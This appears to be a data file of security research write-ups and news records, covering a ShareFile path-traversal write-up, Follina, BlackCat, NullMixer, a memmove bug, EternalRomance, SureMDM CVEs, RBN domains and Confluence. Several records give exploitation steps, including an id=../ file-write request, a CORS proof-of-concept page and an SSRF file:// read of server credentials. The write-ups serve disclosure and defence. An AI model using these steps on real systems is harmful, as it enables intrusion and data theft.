originating from the UploadHttpModule . In FilteringWorkerRequest.ParseOrThrow() , the return value of a FieldNameTranslator.FileFieldNameToPostBackID(string) call ends up in the assignment of that field: The condition of that if branch is that text5 and text4 are set and that FieldNameTranslator.FileFieldNameToPostBackID(string) returns a value for text4 . text5 originates from the filename attribute of a Content-Disposition multi-part header and text4 from its name attribute (see lines 514–517). That means, the request must be a multipart message with one part having a header like this: Content-Disposition: form-data; name=""text4""; filename=""text5"" As for text6 , the FieldNameTranslator.FileFieldNameToPostBackID(string) method call either returns the value of the FieldNameTranslator.PostBackID field if present: By following the assignment of that FieldNameTranslator.PostBackID field, it becomes clear that the internal constructor of FieldNameTranslator takes it from a request query string parameter: So, let's summarize our knowledge of the HTTP request requirements so far: POST /default.aspx?foo HTTP/1.1 Host: localhost Content-Type: multipart/form-data; boundary=""boundary"" Content-Length: 94 --boundary Content-Disposition: form-data; name=""text4""; filename=""text5"" --boundary-- The request path and query string are not yet known, so we'll simply use dummies. This works because HTTP modules are not bound to paths like HTTP handlers are. Important Checkpoints Along The Route Let's set some breakpoints at some critical points and ensure they get reached and behave as assumed: UploadHttpModule.Application_BeginRequest() – to ensure the HTTP module is actually active (the BeginRequest event handler is the first in the chain of raised events ) FieldNameTranslator..ctor() – to ensure the FieldNameTranslator.PostBackID field gets set with our value FilteringWorkerRequest.ParseOrThrow() – to ensure the multipart parsing works as expected UploadContext.set_PostBackID(string) – to ensure the UploadContext.postBackID field is set with our value UploadContext.WritePersistFile() – to ensure the file path and content contain our value After sending the request, the break point at UploadHttpModule.Application_BeginRequest() should be hit. Here we can also see that the module expects the RawUrl to contain upload and .aspx : Let's change default.aspx to upload.aspx and send the request again. This time the break point at the constructor of FieldNameTranslator should be hit. Here we can see that the PostBackID field value is taken from a query string parameter named id or uploadid (which is actually configured in the web.config file). After sending a new request with the query string id=foo , our next break point at FilteringWorkerRequest.ParseOrThrow() should be hit. After stepping through that method, you'll notice that some additional parameters bp and accountid are expected: Let's add them with bogus values and try it again. This time the break point at UploadContext.WritePersistFile() should get hit where the FileStream gets created: So, now we have reached the FileStream constructor but the UploadContext.PostBackID field value is null as it hasn't been set yet. Are We Still On Track? You may have noticed that the break point at UploadContext.set_PostBackID(string) also hasn't been hit yet. This is because the while loop in FilteringWorkerRequest.ParseOrThrow() uses the result of FilteringWorkerRequest.CopyUntilBoundary(string, string, string) as condition but it returns false on its first call so the while block never gets executed. When looking at the code of CopyUntilBoundary(string, string, string) (not depicted here), it appears that it fills some buffer with the posted data and returns false if _doneReading is true . The byte array tmpBuffer has a size of 4096 bytes, which our minimalistic example request certainly does not exceed. After sending a multipart part that is larger than 4096 bytes the break point at the FileStream should get hit twice, once with a null value originating from within the while condition's FilteringWorkerRequest.CopyUntilBoundary(string, string, string) call and once with foo originating from within the while block: Stepping into the FileStream constructor also shows the resulting path, which is C:\inetpub\wwwroot\Citrix\StorageCenter\context\foo . Although context does not exist, we're already within the document root directory that the w3wp.exe process user has full control of: Let's prove this by writing a file to it using id=../foo : We have reached our destination, we can write into the web root directory! What's In The Backpack? Now that we're able to write files, how can we exploit this? We have to keep in mind that the id / uploadid parameter is used for both the file path and the content. That means, the restriction is that we can only use characters that are valid in Windows file system paths. According to the naming conventions of files and paths , the following characters are not allowed: Characters in range of 0–31 (0x00–0x1F) < (less than) > (greater than) : (colon) "" (double quote) | (vertical bar or pipe) ? (question mark) * (asterisk) Here, especially < and > are daunting as we can't write an .aspx web shell, which would require <% … %> or <script runat=""server"">…</script> blocks. Binary files like DLLs are also out as they require bytes in the range 0–31. So, is that the end of this journey? At best a denial of service when overwriting existing files? Have we already tried hard enough? Running With Razor If you are a little more familiar with ASP.NET, you will probably know that there are not just Web Forms (i. e., .aspx , .ashx , .asmx , etc.) but also two other web application frameworks , one of them being MVC (model/view/controller). And while the models and controllers are compiled to binary assemblies, the views are implemented in separate .cshtml files. These use a different syntax, the Razor Pages syntax , which uses @ symbol to transition from HTML to C#: @(""Hello, World!"") And ShareFile does not just use Web Forms but also MVC: Note that we can't just add new views as their rendering is driven by the corresponding controller. But we can overwrite an existing view file like the ConfigService\Views\Shared\Error.cshtml , which is accessible via /ConfigService/Home/Error : What is still missing now is the writing of the actual payload using Razor syntax. We won't show this here, but here is a hint: unlike Unix-based systems, Windows doesn't require each segment in a file path to exist as it gets resolved symbolically. That means, we could use additional ""directories"" to contain the payload as long as we ""step out"" of them so that the resolved path still points to the right file. Timeline And Fix Code White reported the vulnerability to Citrix on May 14th. On August 25th, Citrix released the ShareFile Storage Zones Controller 5.11.20 to address this vulnerability by validating the passed value before assigning FieldNameTranslator.PostBackID : On September 14th, Citrix published the Security Bulletin CTX328123 ."
737af37b-74d4-5920-84d1-10863c612d81,30-May-2022,Follina - Microsoft Zero-Day Vulnerability,Security researchers identified a malicious Word document abusing a previously unidentified zero-day vulnerability in Microsoft products. The vulnerability allows remote and unauthenticated threat actors to execute code from a remote source. Researchers identified the vulnerability under the name “Follina” widespread exploitation of the vulnerability is expected.,"On May 27th, 2022, security researchers identified a malicious Word document abusing a previously unidentified zero-day vulnerability in Microsoft products. The zero-day vulnerability is being tentatively tracked under the name “Follina”. Exploitation of Follina would allow remote and unauthenticated threat actors to achieve Remote Code Execution, with minimal user interaction, by sending a malicious document to potential victims. eSentire is aware of public Proof-of-Concept (PoC) exploit code for Follina; widespread exploitation of the vulnerability is expected in the immediate future. At the time of publishing, security patches to address the vulnerability are not available. Alternative mitigations should be applied to prevent exploitation. On May 27, 2022, researchers at Nao_Sec identified a malicious Office document submitted to VirusTotal on May 25th, 2022. The document exploits a previously unknown vulnerability to execute code retrieved from a remote source. This is accomplished through the following steps: This technique is expected to be adapted by threat actors in the near term to deliver and execute malware. Potential attack vectors include Office documents, templates, and emails. Protected View is considered a barrier but can be bypassed by users, or by attackers using an RTF file. Researchers noted RTF files can be used to trigger the vulnerability from the preview pane in Windows Explorer. Until an official fix is released by Microsoft, the only identified workaround at this time is to remove the ms-msdt handler via the registry. We recommended testing this workaround for issues prior to deployment. Additionally, Microsoft’s Attack Surface Reduction rule to block child processes from spawning has been shown to be effective (see above recommendation). [1] https://twitter.com/nao_sec/status/1530196847679401984 [2] https://twitter.com/sans_isc/status/1531075423270051841 [3] https://media.cert.europa.eu/static/SecurityAdvisories/2022/CERT-EU-SA2022-039.pdf"
247db7a8-f089-58eb-a9f7-1393e2adc903,26-September-2022,BlackCat Ransomware Attackers Spotted Fine-Tuning Their Malware Arsenal,BlackCat ransomware group has been spotted fine-tuning its malware arsenal. Symantec researchers say the group is using a new version of the Exmatter data exfiltration tool. BlackCat is also using info-stealing malware designed to steal credentials from Veeam backup software.,"The BlackCat ransomware crew has been spotted fine-tuning their malware arsenal to fly under the radar and expand their reach. ""Among some of the more notable developments has been the use of a new version of the Exmatter data exfiltration tool, and the use of Eamfo, information-stealing malware that is designed to steal credentials stored by Veeam backup software,"" researchers from Symantec said in a new report. BlackCat, also known by the names ALPHV and Noberus, is attributed to an adversary tracked as Coreid (aka FIN7 , Carbanak, or Carbon Spider) and is said to be a rebranded successor of DarkSide and BlackMatter , both of which shut shop last year following a string of high-profile attacks, including that of Colonial Pipeline. The threat actor, like other notorious ransomware groups, is known to run a ransomware-as-a-service (RaaS) operation, which involves its core developers enlisting the help of affiliates to carry out the attacks in exchange for a cut of the illicit proceeds. ALPHV is also one of the first ransomware strains to be programmed in Rust , a trend that has since been adopted by other families such as Hive and Luna in recent months to develop and distribute cross-platform malware. The evolution of the group's tactics, tools, and procedures (TTPs) comes more than three months after the cybercrime gang was discovered exploiting unpatched Microsoft Exchange servers as a conduit to deploy ransomware. Subsequent updates to its toolset have incorporated new encryption functionalities that enable the malware to reboot compromised Windows machines in safe mode to bypass security protections. ""In a July 2022 update the team added indexing of stolen data -- meaning its data leaks websites can be searched by keyword, file type, and more,"" the researchers said. The latest refinements concern Exmatter , a data exfiltration tool used by BlackCat in its ransomware attacks. Besides harvesting files only with a specific set of extensions, the revamped version generates a report of all processed files and even corrupts the files. Also deployed in the attack is an info-stealing malware called Eamfo that's designed to siphon credentials stored in the Veeam backup software and facilitate privilege escalation and lateral movement. The findings are yet another indication that ransomware groups are adept at continually adapting and refining their operations to remain effective as long as possible. ""Its continuous development also underlines the focus of the group on data theft and extortion, and the importance of this element of attacks to ransomware actors now,"" the researchers said. BlackCat has also been recently observed using the Emotet malware as an initial infection vector, not to mention witnessing an influx of new members from the now-defunct Conti ransomware group following the latter's withdrawal from the threat landscape this year. The sunsetting of Conti has also been accompanied by the emergence of a new ransomware family dubbed Monti , a ""doppelganger"" group which has been found purposefully and brazenly impersonating the Conti team's TTPs and its tools. News of BlackCat adding a revamped slate of tools to its attacks arrives as a developer associated with the LockBit 3.0 (aka LockBit Black) file-encrypting malware allegedly leaked the builder used to create bespoke versions, prompting concerns that it could lead to more widespread abuse by other less skilled actors. It's not just LockBit. Over the past two years, Babuk and Conti ransomware groups have suffered similar breaches, effectively lowering the barrier for entry and enabling malicious actors to quickly launch their own attacks."
fe24c1ef-fd83-5654-884b-6d2f261d9940,27-September-2022,New NullMixer Malware Campaign Stealing Users' Payment Data and Credentials,"Malware called NullMixer is being used to infect more than 47,000 victims worldwide. Cybercriminals are targeting users searching for cracked software with malicious websites. The sites host weaponized installers that deploy malware called trojans on compromised systems. Kaspersky says the malware can siphon off users' credentials and other information.","Cybercriminals are continuing to prey on users searching for cracked software by directing them to fraudulent websites hosting weaponized installers that deploy malware called NullMixer on compromised systems. ""When a user extracts and executes NullMixer, it drops a number of malware files to the compromised machine,"" cybersecurity firm Kaspersky said in a Monday report. ""It drops a wide variety of malicious binaries to infect the machine with, such as backdoors, bankers, downloaders, spyware, and many others."" Besides siphoning users' credentials, address, credit card data, cryptocurrencies, and even Facebook and Amazon account session cookies, what makes NullMixer insidious is its ability to download dozens of trojans at once, significantly widening the scale of the infections. Attack chains typically start when a user attempts to download cracked software from one of the sites, which leads to a password-protected archive that contains an executable file that, for its part, drops and launches a second setup binary designed to deliver an array of malicious files. These malicious websites leverage search engine optimization (SEO) poisoning techniques such as keyword stuffing to feature them highly in search engine results. Similar tactics have been adopted by actors behind GootLoader and SolarMarker campaigns. NullMixer, last month, was linked to the distribution of a rogue Google Chrome extension called FB Stealer , which is capable of Facebook credential theft and search engine substitution. Some of the other prominent malware families distributed by the dropper include DanaBot and a raft of information-stealing malware such as ColdStealer , PseudoManuscrypt , Raccoon Stealer , Redline Stealer , and Vidar . Also deployed using NullMixer are trojan downloaders like FormatLoader, GCleaner, LegionLoader (aka Satacom), LgoogLoader, PrivateLoader , SgnitLoader, ShortLoader, and SmokeLoader , as well as the C-Joker cryptocurrency wallet stealer. Kaspersky said it blocked attempts to infect more than 47,778 victims worldwide, with a majority of the users located in Brazil, India, Russia, Italy, Germany, France, Egypt, Turkey, and the U.S. The threat actor operating NullMixer has not been attributed to a known group. The latest findings are yet another indication that malware and unwanted applications are being increasingly propagated via pirated software. It's also recommended to check online accounts regularly for unknown transactions. ""Any download of files from untrustworthy resources is a real game of roulette: you never know when it will fire, and which threat you will get this time,"" Kaspersky researcher Haim Zigel said . ""Receiving NullMixer, users get several threats at once."""
6a2666c2-4e37-5ab5-969a-bd13b3aabc41,25-October-2016,The Implied Security of memmove(),Memmove can be exploitable if the size value is bit aligned and the original source buffer is mapped in memory. I found a bug in windbg that exploited this bug. The bug was caused by a call to memmove that used a smaller source buffer.,"Calls to memmove that use a source buffer that is smaller than the destination buffer can be at times exploitable if the size value is bit aligned, is mapped in memory and that the original source buffer is also mapped in memory. So, the other day I was debugging a vulnerability I had found and trying to understand the issue by performing a root cause analysis (RCA). I was, all up in windbg doing my thing, setting break points and getting all crazy. I ended up with the following breakpoint when messing in the windbg. bp msvcrt!memmove "".if (poi(@esp+8)==0) {.printf \""calling memmove(0x%x, 0x%x, 0x%x);\\n\"", poi(@esp+4), poi(@esp+8), poi(@esp+c);} .else {gc}"" So this breakpoint will only break into the debugger if a call to memmove has the second argument set to null. Checking my windbg log, I see the following: calling memmove(0x1613fe8, 0x0, 0x0161aa10); Everyone knows that the memmove prototype across architectures is: void *memmove( void *dest, const void *src, size_t count ); Naturally, I attempt to investigate the situation. 1:001> !address 0x0161aa10 ProcessParametrs 001812b0 in range 00180000 0018a000 Environment 00180810 in range 00180000 0018a000 015b0000 : 015b0000 - 00073000 Type 00020000 MEM_PRIVATE Protect 00000004 PAGE_READWRITE State 00001000 MEM_COMMIT Usage RegionUsageHeap Handle 00530000 1:001> !heap -p -a 0x0161aa10 address 0161aa10 found in _HEAP @ 530000 HEAP_ENTRY Size Prev Flags UserPtr UserSize - state 01613fe0 0f48 0000 [00] 01613fe8 07a28 - (busy) 1:001> !address 0x1613fe8 ProcessParametrs 001812b0 in range 00180000 0018a000 Environment 00180810 in range 00180000 0018a000 015b0000 : 015b0000 - 00073000 Type 00020000 MEM_PRIVATE Protect 00000004 PAGE_READWRITE State 00001000 MEM_COMMIT Usage RegionUsageHeap Handle 00530000 1:001> !heap -p -a 0x1613fe8 address 01613fe8 found in _HEAP @ 530000 HEAP_ENTRY Size Prev Flags UserPtr UserSize - state 01613fe0 0f48 0000 [00] 01613fe8 07a28 - (busy) As it turns out, the size value is actually a mapped heap chunk! To make it worse (or better), the least significant bytes are always mapped to offset 0xaa10, which I can control based on allocation size in the target. It looks like the developer of my target got his/her parameters mixed up! My guess is that the second and third arguments should have switched: calling memmove(0x1613fe8, 0x0161aa10, 0x0); Anyway, when I continued execution, I was surprised to see the following output: 1:001> g (1c38.1260): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=0161aa10 ebx=00000000 ecx=00586a84 edx=00000000 esi=0161aa0c edi=02c2e9f4 eip=7687c120 esp=00129ba0 ebp=00129ba8 iopl=0 nv dn ei pl nz ac po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010612 msvcrt!memmove+0x1e0: 7687c120 f3a5 rep movs dword ptr es:[edi],dword ptr [esi] 1:001> dd @esi L1 0161aa0c 41414141 1:001> dd @edi L1 02c2e9f4 ???????? 1:001> !address @edi ProcessParametrs 001812b0 in range 00180000 0018a000 Environment 00180810 in range 00180000 0018a000 01a33000 : 01a33000 - 0e5cd000 Type 00000000 Protect 00000001 PAGE_NOACCESS State 00010000 MEM_FREE Usage RegionUsageFree 1:001> !heap -p -a @esi address 0161aa0c found in _HEAP @ 530000 HEAP_ENTRY Size Prev Flags UserPtr UserSize - state 01613fe0 0f48 0000 [00] 01613fe8 07a28 - (busy) An Out-of-Bounds write on unmapped memory? How could this be? Well as it turns out, the copy operation is doing a backwards copy . To find that out I dove into the Microsoft’s implementation of memmove within the 32bit architecture. I used the following DLL: C:\Windows\System32\msvcrt.dll v7.0.7601.1744 (latest at the time of writing). void * __cdecl memmove ( void * Dst , const void * Src , size_t Size ) { const void * v3 ; void * v4 ; size_t v5 ; void * result ; int v7 ; int v8 ; unsigned int v9 ; signed int v10 ; unsigned int v11 ; v3 = Src ; v4 = Dst ; if ( Dst <= Src || Dst >= ( char * ) Src + Size ) // passed the check size dst > src (0x0) and dst < src+size { ... } v7 = ( int )(( char * ) Src + Size - 4 ); // set the src buffer based on size value - 0x4 v8 = ( int )(( char * ) Dst + Size - 4 ); // set the dst buffer based on size value - 0x4 if ( ! ( v8 & 3 ) ) // check if dst is bit aligned to the cpu { v9 = Size >> 2 ; v10 = Size & 3 ; if ( Size >> 2 < 8 ) // jump if (size / 4) is < 0x8 (which, it wont be if its a large value) { LABEL_36: switch ( - v9 ) { case 0u : break ; } } else // else, we are here { qmemcpy (( void * ) v8 , ( const void * ) v7 , 4 * v9 ); // out of bounds copy ... } As you can see, its very similar to OS X’s implementation or GNU’s implementation . So the same situation would happen on Linux or Mac OS X under 32 bit implementations. What you will notice here is that there is no sanity check on the source buffer whatsoever inside memmove. The source buffer is NULL? No worries, continue execution. However, do note that if NULL is not mapped, then an access violation will occur since the backwards copy performs a – instead of a ++. Thanks to @badd1e for pointing this out. Depending on how you are targeting your exploitation, an access violation might be ok as you can potentially use the initial out-of-bounds write to target an unhandled exception function pointer . Regarding exploitation, the following is needed: (void *)0x0 as the source buffer. Actually, as long as the src buffer is smaller than the dst buffer, this is still possible. You will likely need whatever the src value is, to be mapped in memory. If it is null, then the null page will need to be mapped to survive the copy operation. A bit aligned size value, in my case it was 32bits or 4 bytes The destination + size to point to a mapped and writable location in memory. The size value to be a valid pointer to controlled data, rare indeed. Summary Now I know what a lot of you neckbeards are going to say, that developers should be careful about the parameters parsed to mem* functions. But the simple matter is, is that a simple check for a source buffer that is not mapped would have made this particular vulnerability un-exploitable. Whilst this is a very bizarre corner case, it goes to show that the lack of sanity checking for the sake of speed can cause all sorts of undesired effects, potentially leading to an exploitable condition. Since I can relatively control the size value (based on the allocation bucket) and the source buffer passed into memmove() is always NULL, I can trigger a relative wild write at a semi-controlled location. Sure, not the most amazing primitive, but when the application is installed and running as SYSTEM on 99% of enterprise applications, hackers become motivated. A big thanks goes out to @rohitwas for his validation of my insanity and @badd1e for pointing out that the src buffer (be it null or not), needs to be mapped in memory!"
4a68ebb3-47ee-5dbf-bfa8-5821566393bd,16-June-2018,Dissecting a Bug in the EternalRomance Client (FuzzBunch),EternalRomance is a bug in the Equation Group's client for SMBv1. The bug causes the client to multiplex transactions without the need for a specific MID. The Equation group uses a static PID to separate transactions.,"Note: This post does not explain the EternalRomance exploit chain, just a quirky bug in the Equation Group's client. For comprehensive exploit details, come see my presentation at DEF CON 26 (August 2018). Background In SMBv1, transactions are looked up via their User ID, Tree ID, Process ID, and Multiplex ID fields (UID, TID, PID, MID). This allows a client to have many transactions running at once, as needed. UID and TID are server-assigned, and PID is client-set but usually static. Generally, a client will only use the MID, set to a random value, to distinguish distinct transactions. Fish in a Barrel In EternalRomance, the MID must be set to a specific value (File ID). In order for the Equation Group to multiplex multiple transactions, the PID is used instead. The PID is what separates ""dynamite sticks"" in the Fish-In-A-Barrel heap feng shui. Figure 1. Fish in a Barrel (Red: Dynamite - Blue: Fish) Dynamite are transactions that can (ideally) cause overflow into another transaction. Sometimes a dynamite stick fails, simply because memory allocations can be volatile. In this case, EternalRomance should try the next stick. Discovering the Bug I had nop'd out the Srv.sys vulnerability being exploited using WinDbg so that I could observe the network traffic during failures and other various reasons. I noticed that EternalRomance, during the grooming phase, sent dynamite sticks with PIDs 0, 1, and 2. However, it was only attempting to ignite one PID (dynamite stick) for every execution attempt. The PID 0. This must be a mistake because igniting the same dynamite 3 times in a row does absolutely nothing but send superfluous network traffic with no change in result. A dynamite stick either works or it simply always will be a dud. And besides, why did it bother to send the other 2 dynamite in the first place? In fact, igniting the same dynamite stick multiple times is dangerous, because it increments a pointer each time, and the offset for the overwrite (a neighboring MID) stays static. On a side note, I also noticed the first exploit attempt always tries to overwrite two bytes, and all secondary dynamite attempts only overwrite one byte. Because of the way they set up the exploit, only a one byte overwrite is necessary (though two bytes won't hurt if it hits the right place). Another peculiarity. I messed around with the MaxExploitAttempt settings, which has a default value of 3. I set it to its maximum allowed of 16. Now the PID started at 3? This time, PIDs 3 through 15 were observed, and the last 3 exploit attempts sent PID=0. The Binary is Truth Well some debugging later, I figured out that the InitializeParameters() function (there are no symbols in the binary, but a few functions have helpful debug strings when handling error conditions) was allocating two arrays for the dynamite stick PIDs. unsigned int size = ExploitStruct->MaxExploitAttempts_0x4360; if (size <= 16) { ExploitStruct->PidTable_0x44a0 = (PWORD) TbMalloc(2 * size); ExploitStruct->PidTable_0x44a4 = (PWORD) TbMalloc(2 * size); } else { // print error message: too many max exploit attempts } TbMalloc is Equation Group's library function (tibe-2.dll) that just calls malloc() and then memset() to 0 (essentially calloc() but with one argument). I set a hardware breakpoint on the tables and noticed that in SmbRemoteApiTransactionGroom() (another unnamed function) there was the following logic. This function completes when the dynamite are initially sent (before any are ignited). if (DynamiteNum >= 3) { ExploitStruct->PidTable_0x44a4[DynamiteNum - 3] = DynamitePid; } else { ExploitStruct->PidTable_0x44a0[DynamiteNum] = DynamitePid; } Later, in DoWriteAndXExploitTransactionForRemApi(), the table where DynamiteNum >= 3 is used to source PIDs to ignite the dynamite. This means PidTable_0x44a4 is never given values when MaxExploitAttempts=3. Observe 3 shorts set to 0 at the address in the dump. And we can see the cause for the quirky behavior of the network traffic starting at PID=3, when MaxExploitAttempts=16 (or any greater than 3). Observe several shorts incrementing from 3, followed by three 0. As far as I can tell, the PidTable_0x44a0 table (the one that holds the first 3 PIDs) simply isn't used, at least when tested against several versions of Windows XP and Server 2003. Conclusion This bug was probably missed, by both analysts and the Equation Group, for a few reasons: Fish in a Barrel is only used for older versions of Windows (it's fixed in 7+) It almost always succeeds the first time, as it is a rarely used pre-allocated heap TbMalloc initializes all PID to 0, and the first dynamite PID is 0 The bug is quite subtle, I missed it several times because of assumptions The real mystery is why is there this logic for the second table that isn't used?"
be2e4fbf-e0c6-5f3e-a565-b0632bbda1c7,31-January-2019,Multiple Vulnerabilities Found in Mobile Device Management Software,"SureMDM is a Windows based mobile device management system. SureMDM allows users to manage a large number of mobile devices. The vendor's customers include AT&T, Facebook and Siemens. Sure MDM has two dangerous misconfigurations that allow cross-origin requests.","A few months ago during a penetration test, we stumbled upon a Windows based mobile device management [MDM] system named SureMDM. MDM systems aim to provide an efficient means of managing a large number of mobile devices, ensuring that they are all configured to the same standard and kept secure. The customers section of the vendor’s website boasts quite the impressive list, including organisations such as AT&T, Facebook and Siemens, to name a few. With a wide user base, it was presumed the system would be quite extensive and have a larger attack surface to explore. Initially, there was not a great deal presented to us. Pretty much the entire system required authentication and we had no credentials. However, there were two dangerous misconfigurations that allowed cross-origin requests; which were the first of several vulnerabilities, that when combined with other issues that were found, could lead to a severe compromise. Weak CORS Configuration: CVE-2018-15655 The first of the misconfiguration issues was in the CORS policy. The CORS policy would allow requests to be made from any origin. As a result of this, if an attacker was able to lure a user to a website that they either control or have compromised in some way, they could effectively carry out any action as the victim and exfiltrate sensitive data. To confirm this, we hosted a small proof of concept on one of our servers, the markup for which can be found below: <html> <head> <script type= ""text/javascript"" src= ""https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"" ></script> </head> <body> <pre class= ""remote-content"" > </pre> <script type= ""text/javascript"" > var url = ( location . search . split ( ' url= ' )[ 1 ] || '' ). split ( ' & ' )[ 0 ] $ . get ( url , null , function ( data ) { $ ( ' .remote-content ' ). text ( data ) }, ' text ' ) </script> </body> </html> This page will attempt to load the address provided to the url query string parameter, and display the data on screen. If a URL is requested from a website with a secure CORS policy, it will result in an error, as can be seen in the below screenshot when requesting a resource from Google: However, when changing the URL to one being served by the SureMDM system, the request is successful and the content available to be processed: Weak Silverlight Access Policy: CVE-2018-15659 Much like the weak CORS policy, the weak Silverlight access policy meant that a request could be made from any origin via a Silverlight application. To test this, we used This PoC from NCC Group . When a resource served by SureMDM was specified as the target page, the Silverlight application could successfully access the resource from a different origin: Incorrect Access Control: CVE-2018-15658 After discovering the cross-origin issues, we were left with only theoretical scenarios to present to the client as we weren’t sure of what could be achieved from the web UI; then we came across /console/ConsolePage/Master.html . As one would expect from a page that requires authentication, when we tried to access this, we were redirected back to the login page - something was not quite right though. When reviewing our request history - there was no sign of any responses with a 3xx code . This prompted us to take a look at the request being made to Master.html and revealed that the session validation and redirection was being carried out in the JavaScript as the page is loaded. The result of this? We were able to see the markup that would be presented to an authenticated user: Upon examining the markup, we were able to gather links to unprotected resources which when pooled together revealed over 100 different API endpoints. These endpoints included functions to carry out a number of highly sensitive actions, such as: Retrieve call logs from a managed device Retrieve SMS logs from a managed device Manipulate device blacklists / whitelists Retrieve and manipulate user account data With so many API functions available, the CSRF vulnerabilities that were previously identified were of a much higher severity, putting the mobile devices being managed by SureMDM and the MDM system itself at risk of compromise. Unauthenticated Information Exposure: CVE-2018-15656 At this point, we had several highly sensitive resources as well as two vulnerabilities that could be used to reliably carry out cross-site request forgery attacks. To add to this, we were able to identify an API endpoint which did not require authentication and would confirm whether a specified e-mail address is registered against a user account within the SureMDM system. By making a GET request to /api/register/$1 , where $1 is a base64 encoded e-mail address, the web server will respond with either true or false in the response body, indicating that the e-mail is in use or not. In addition to specifying the e-mail address, it was also required that a ApiKey header be declared with the value apiKey . For example, to verify whether jenny@8675309.ext exists in the system, the below request would have to be made: GET /api/register/amVubnlAODY3NTMwOS5leHQ= HTTP / 1.1 Host : 127.0.0.1 User-Agent : Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0 Accept : application/json, text/javascript, */*; q=0.01 Accept-Language : en-US,en;q=0.5 Accept-Encoding : gzip, deflate Referer : http://127.0.0.1/console/?16.0 Content-Type : application/json; charset=utf-8 X-Requested-With : XMLHttpRequest Content-Length : 0 Connection : close ApiKey : apiKey By utilising this information exposure, it further increases the chances of a successful phishing campaign paired up with the CSRF vulnerabilities. Server Side Request Forgery: CVE-2018-15657 Lastly, we were able to identify another unauthenticated endpoint which posed a more significant issue than the one documented in CVE-2018-15656. The resource we identified can be found at /api/DownloadUrlResponse.ashx and accepts user input via a query string parameter named url . The URL provided in the url parameter will subsequently be requested by the web server and the content output in the response to the user. This opens up the possibility of cross-site scripting attacks, with complete evasion of the default protections in several browsers, as no markup is being passed via the URL; but rather the address of the resource to load: In addition to being able to serve remote files from the SureMDM host, it was also possible to use this SSRF vulnerability to serve files from the local filesystem of the server. As the URI schema is not validated, file:// URIs can be passed in the url parameter, such as file://C:/WINDOWS/System32/drivers/etc/hosts : After enumerating some older documentation of SureMDM that we were able to find online, we identified the default install path of the IIS application, and confirmed that the vulnerability can be used to recover the SQL server credentials and other sensitive pieces of information within the Web.config and webConnection.config files: Disclosure Timeline 2018-08-21 : Contact vendor to request contact information of an appropriate member of staff to disclose vulnerability information to. 2018-09-06 : Contact vendor again due to no response to initial e-mail. 2018-09-24 : Contact vendor again due to no response to any previous e-mails. 2018-09-25 : Response from vendor and disclosure of all vulnerabilities along with suggested remediation steps. 2018-11-27 : Vendor issued patch and began reaching out to their customers to push the patch on to their systems. 2019-02-01 : Disclosure made public"
1d57ea56-1b58-5f46-9b86-085d865ab092,07-October-2022,The Inner Workings of the Russian Business Network,"Russian Business Network hosted sites owned by spammers and other cybercriminals. Threat researchers found 399 domains that could be connected to the network. The sites were registered in eight countries, with most in the U.S. and Germany.","The Russian Business Network (RBN) claimed to be a legitimate Internet service provider (ISP) back in 2006. Shortly after establishing its business, however, it gained notoriety for hosting the sites owned by spammers, malware operators, distributed denial-of-service (DDoS) attackers, and other cybercriminals. Throughout its operation, RBN’s claims to fame include being tagged “ the baddest of the bad ” by VeriSign. Spamhaus, meanwhile, named it “among the world’s worst spam, malware, phishing, and cybercrime hosting networks,” thus including several of its IP addresses in its blocklist. While RBN has seemingly gone quiet for some time, our threat researchers are wondering if it has shut down. Our in-depth look into what’s left of the RBN infrastructure revealed: A sample of the additional artifacts obtained from our analysis is available for download from our website . Over the years, the cybersecurity community has collated IoCs related to RBN, including these 26 domains: We used these web properties as jump-off points for our investigation. A closer look at the domains’ historical WHOIS records allowed us to uncover 21 unredacted email addresses used to register the IoCs. DNS lookups for the IoCs led to the discovery of 45 IP addresses to which they resolved. These were spread across eight countries topped by the U.S., Germany, China, and the British Virgin Islands. We then expanded the list of IoCs with possibly connected artifacts, specifically domains, that shared their registrant email addresses or IP hosts. Consistent with the IP geolocation data, according to a bulk WHOIS lookup , most of the possibly connected domains were registered in the U.S., followed by the Czech Republic, China, and Germany. The rest were scattered across 10 other countries—Japan, Russia, Canada, Iceland, Taiwan, Thailand, Mexico, Panama, Turkey, and the U.A.E. The bulk WHOIS lookup also showed that a majority of the additional domains were created between 2015 and 2022. Reverse WHOIS searches and reverse IP lookups uncovered 399 domains that could have ties to the RBN infrastructure. A bulk malware check on the Threat Intelligence Platform (TIP) showed that organizations should block access to four of them—ilo[.]brenz[.]pl, ant[.]trenz[.]pl, www[.]ipshougou[.]com, and www[.]52cps[.]com. Organizations that wish to steer clear of the dangers that RBN-hosted web properties pose can block access to the malicious domains identified in this post, apart from those already identified as IoCs. Monitoring for malicious activities related to the IP addresses that host the IoCs would also be helpful. Keeping a keen eye on domains containing the names of anti-malware programs or any software that don’t look legitimate is also advised. Finally, including web properties connected to the identified registrant email addresses in threat monitoring efforts could also be worth doing. If you wish to perform a similar investigation or get access to the full data behind this research, please don’t hesitate to contact us ."
36987214-207b-5449-a998-95cb5fcff343,03-June-2022,CVE-2022-26134 – Confluence Zero-Day Vulnerability,Atlassian has disclosed a critical vulnerability impacting all versions of Confluence Server and Data Center. The vulnerability is known as CVE-2022-26134 and has been confirmed to be active exploitation. Vulnerable versions of the Confluence collaboration tool could be vulnerable to remote code execution.,"On June 2nd, 2022, Atlassian disclosed a critical vulnerability impacting the Confluence collaboration tool, tracked as CVE-2022-26134 ; active exploitation of the vulnerability has been confirmed. CVE-2022-26134 is an unauthenticated Remote Code Execution (RCE) vulnerability that impacts all supported versions of Confluence Server and Data Center. Exploitation of this vulnerability would allow an unauthenticated and remote actor to execute code on vulnerable devices, potentially leading to the deployment of malware or the exfiltration of sensitive data. At this time, security patches to address CVE-2022-26134 are not available. Atlassian has stated that patches will be released by end-of-day June 3rd, 2022. The current recommendations for organizations employing Confluence Server or Data Center are to restrict access from the internet or disable the instances; it should be noted that both recommendations may cause disruptions to standard business procedures. Technical details relating to CVE-2022-26134 are currently limited as Atlassian is not releasing additional information until after security patches are made available. While not yet confirmed, it is likely that all versions of Confluence Server and Data Center are impacted, including out of support versions. The vulnerability does not impact Confluence Cloud. CVE-2022-26134 was initially discovered by Volexity . According to the company, attacks exploiting the vulnerability were first identified on the Memorial Day weekend (May 28th-30th). Attacks observed by Volexity resulted in the deployment of the open-source webshell 